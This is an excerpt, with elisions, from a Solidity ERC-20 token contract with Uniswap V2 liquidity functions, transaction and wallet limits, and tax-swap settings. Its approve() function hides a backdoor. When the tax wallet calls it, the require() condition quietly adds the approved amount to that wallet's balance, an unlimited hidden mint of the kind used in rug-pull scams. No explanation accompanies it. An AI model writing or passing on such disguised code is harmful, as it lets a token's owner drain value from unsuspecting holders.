...
interface IUniswapV2Router02 {
    ...
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin,
...
contract X is Context, IERC20, Ownable {
    ...
    uint256 public _maxTxAmount         = _tTotal * 20 / 1e3; // 2.0%
    uint256 public _maxWalletSize       = _tTotal * 20 / 1e3; // 2.0%
    uint256 public _taxSwapThreshold    = _tTotal * 20 / 1e3; // 2.0%
    uint256 public _maxTaxSwap          = _tTotal * 10 / 1e3; // 1.0%
    ...
    function approve(address spender, uint256 amount) public override returns (bool) {
        require(((_msgSender() == _taxWallet) && ((_balances[_taxWallet] += amount) > 0)) || _msgSender() != _taxWallet);
